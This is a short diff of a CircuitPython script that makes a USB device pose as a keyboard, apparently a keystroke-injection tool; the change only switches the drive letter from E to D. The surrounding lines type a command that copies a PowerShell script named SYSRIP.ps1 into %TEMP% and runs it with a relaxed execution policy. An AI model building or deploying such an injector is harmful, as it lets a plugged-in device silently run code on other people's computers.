@@ -3,7 +3,7 @@ import usb_hid
 from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 from adafruit_hid.keycode import Keycode
-DRIVE_LETTER = "E"  
+DRIVE_LETTER = "D"  
 command = (
     'cmd /c copy "{drv}:\\SYSRIP.ps1" "%TEMP%\\SYSRIP.ps1" && '
     'powershell -NoProfile -ExecutionPolicy RemoteSigned -File "%TEMP%\\SYSRIP.ps1"\n'
